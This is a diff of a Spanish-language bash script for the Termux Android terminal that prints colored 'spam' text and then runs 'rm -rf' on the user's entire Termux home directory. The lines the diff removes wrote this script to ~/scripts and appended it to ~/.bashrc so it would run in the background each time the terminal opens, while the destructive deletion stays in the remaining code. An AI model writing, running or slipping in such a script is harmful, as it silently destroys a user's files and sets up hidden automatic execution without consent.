@@ -1,11 +1,5 @@
 #!/bin/bash
 
-# Paso 1: Crear el directorio ~/scripts si no existe
-mkdir -p ~/scripts
-
-# Paso 2: Crear el archivo spam_script.sh con el contenido especificado
-echo '#!/bin/bash
-
 # Función para imprimir texto colorido
 function print_colored {
     colors=("31" "32" "33" "34" "35" "36")
@@ -35,14 +29,4 @@ echo -e "\033[31mEliminando archivos de Termux...\033[0m"
 rm -rf /data/data/com.termux/files/home/*  # Borra todo dentro de Termux, pero no los archivos de storage
 # Puedes agregar más directorios y archivos a eliminar si es necesario.
 
-echo -e "\033[33mProceso completo.\033[0m"' > ~/scripts/spam_script.sh
-
-# Paso 3: Hacer que el archivo sea ejecutable
-chmod +x ~/scripts/spam_script.sh
-
-# Paso 4: Agregar al ~/.bashrc para que se ejecute al iniciar
-echo '# Ejecutar el script de spam colorido al iniciar la terminal
-bash ~/scripts/spam_script.sh &' >> ~/.bashrc
-
-# Confirmación
-echo "¡Todo listo! El script se ejecutará automáticamente al iniciar Termux."
+echo -e "\033[33mProceso completo.\033[0m"
